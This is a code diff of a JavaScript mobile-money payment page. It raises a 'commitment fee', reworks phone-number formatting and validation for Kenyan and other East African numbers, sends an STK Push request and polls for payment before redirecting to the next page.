@@ -58,9 +58,9 @@ const selectedAmount = localStorage.getItem("selectedAmount") || "0";
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
 // Commitment fee
-const commitmentFee = 14;
+const commitmentFee = 20;
 
-// Country prefixes supported
+// Supported countries & networks
 const countryPrefixes = {
   '254':'KE',
   '256':'UG',
@@ -68,7 +68,6 @@ const countryPrefixes = {
   '260':'ZM'
 };
 
-// Default network per country
 const defaultNetwork = {
   'KE':'MPESA',
   'UG':'MTN',
@@ -76,52 +75,59 @@ const defaultNetwork = {
   'ZM':'ZAMTEL'
 };
 
-// Normalize phone: ensure starts with +
-function formatPhone(number){
-  return number.startsWith('+') ? number : '+' + number;
+// Format phone for API
+function formatPhone(number, country){
+  number = number.trim();
+  if(country==='KE'){
+    // Convert 07xxxxxxx or 01xxxxxxx to 2547xxxxxxx
+    if(number.startsWith('07') || number.startsWith('01')) return '254' + number.substring(1);
+    if(number.startsWith('+254')) return '254' + number.substring(4);
+    if(number.startsWith('0')) return '254' + number.substring(1);
+  }
+  return number.startsWith('+') ? number.substring(1) : number;
 }
 
 // Detect country from phone
 function detectCountry(number){
-  let prefix = number.startsWith('+') ? number.substring(1,4) : number.substring(0,3);
+  number = number.trim();
+  if(number.startsWith('07') || number.startsWith('01')) return 'KE'; // auto Kenya
+  if(number.startsWith('+')) number = number.substring(1);
+  const prefix = number.substring(0,3);
   return countryPrefixes[prefix] || '';
 }
 
-// Validate phone with country code
+// Validate phone number
 function isValidPhone(number){
-  return /^\+?(254|256|255|260)[0-9]{8,9}$/.test(number);
+  return number && (number.startsWith('07') || number.startsWith('01') || /^\+?(254|256|255|260)[0-9]{8,9}$/.test(number));
 }
 
 async function payNow(){
 
-  const phone = document.getElementById("phone").value.trim();
+  const phoneInput = document.getElementById("phone").value.trim();
   const msg = document.getElementById("message");
   const spinner = document.getElementById("spinner");
 
-  if(!phone){
+  msg.innerText = "";
+  spinner.style.display = "none";
+
+  if(!phoneInput){
     msg.innerText="Enter your phone number";
     msg.style.color="red";
     return;
   }
 
-  if(!isValidPhone(phone)){
-    msg.innerText="Invalid phone number. Include country code e.g. +2547XXXXXXX";
+  if(!isValidPhone(phoneInput)){
+    msg.innerText="Invalid phone number. Include country code or start with 07/01 for Kenya.";
     msg.style.color="red";
     return;
   }
 
-  const phoneToSend = formatPhone(phone);
-  const country = detectCountry(phoneToSend);
-  if(!country){
-    msg.innerText="Unsupported country. Only KE, UG, TZ, ZM allowed.";
-    msg.style.color="red";
-    return;
-  }
-
+  const country = detectCountry(phoneInput);
+  const phoneToSend = formatPhone(phoneInput, country);
   const network = defaultNetwork[country];
 
   spinner.style.display="block";
-  msg.innerText="Sending payment request... please check your phone";
+  msg.innerText="Waiting for STK Push to be initiated... please check your phone";
   msg.style.color="black";
 
   try{
@@ -142,9 +148,9 @@ async function payNow(){
     if(data.success){
       msg.innerText="STK Push sent ✅ Enter your mobile money PIN to confirm";
       msg.style.color="green";
-      checkPayment(data.reference,"payment4.html");
+      checkPayment(data.reference,"payment5.html");
     } else {
-      msg.innerText="Payment failed: " + (data.message || "Try again");
+      msg.innerText="Payment failed: "+(data.message || "Try again");
       msg.style.color="red";
     }
 
@@ -153,16 +159,15 @@ async function payNow(){
     msg.innerText="Server error: "+(err.message || "Try again");
     msg.style.color="red";
   }
-
 }
 
-async function checkPayment(reference,nextPage){
+async function checkPayment(reference, nextPage){
   const msg=document.getElementById("message");
   let attempts=0;
 
   const interval=setInterval(async()=>{
     attempts++;
-    if(attempts>20){
+    if(attempts>40){
       clearInterval(interval);
       msg.innerText="Payment timeout. Please retry.";
       msg.style.color="red";
